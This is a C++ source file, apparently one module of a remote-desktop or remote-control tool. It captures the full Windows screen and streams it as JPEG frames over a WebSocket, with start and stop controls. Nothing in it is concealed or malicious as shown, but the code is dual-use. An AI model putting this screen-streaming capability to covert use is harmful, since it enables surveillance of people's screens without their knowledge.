#include "screen.h"

cv::Mat captureScreenMat() {
    RECT desktop;
    const HWND hDesktop = GetDesktopWindow();
    GetWindowRect(hDesktop, &desktop);

    int width = desktop.right;
    int height = desktop.bottom;

    HDC hScreenDC = GetDC(nullptr);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    SelectObject(hMemoryDC, hBitmap);

    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY | CAPTUREBLT);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    cv::Mat mat(height, width, CV_8UC3);
    GetDIBits(hMemoryDC, hBitmap, 0, height, mat.data, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);

    return mat;
}

void startScreen(std::shared_ptr<websocket::stream<tcp::socket>> ws_ptr) {

    std::lock_guard<std::mutex> lock(g_control_mutex);

    if (g_screen.load()) return; 
    g_screen = true;

    screen_thread = std::thread([ws_ptr]() {
        try {
            std::vector<BYTE> buf;

            while (g_screen.load()) {
                cv::Mat frame = captureScreenMat();
                if (frame.empty()) continue;

                cv::Mat smallFrame;
                cv::resize(frame, smallFrame, cv::Size(frame.cols / 3 * 2, frame.rows / 3 * 2));

                buf.clear();
                cv::imencode(".jpg", smallFrame, buf, {cv::IMWRITE_JPEG_QUALITY, 100});

                try {
                    // std::lock_guard<std::mutex> lock(ws_mutex);
                    sendMsg(*ws_ptr, "binary", "Screen", buf);
                } catch (std::exception& e) {
                    std::cerr << "WebSocket write error: " << e.what() << "\n";
                    break;
                }

                std::this_thread::sleep_for(std::chrono::milliseconds(50)); 
            }
        } catch (std::exception& e) {
            std::cerr << "Screen thread exception: " << e.what() << "\n";
        }

        g_screen = false;
        std::cout << "Screen thread stopped.\n";
    });
}

void stopScreen() {

    std::lock_guard<std::mutex> lock(g_control_mutex);

    if (!g_screen.load()) {
        return;
    }

    g_screen = false;

    std::thread temp_thread = std::move(screen_thread); 

    std::thread([t = std::move(temp_thread)]() mutable { 
        try {
            if (t.joinable()) {
                t.join(); 
                std::cout << "Reaper: Screen thread joined." << std::endl;
            }
        } catch (const std::exception& e) {
            std::cerr << "Reaper: Exception caught joining screen thread: " << e.what() << std::endl;        
        } catch (...) {
            std::cerr << "Reaper: Unknown exception caught joining screen thread." << std::endl;        
        }
    }).detach(); 

}
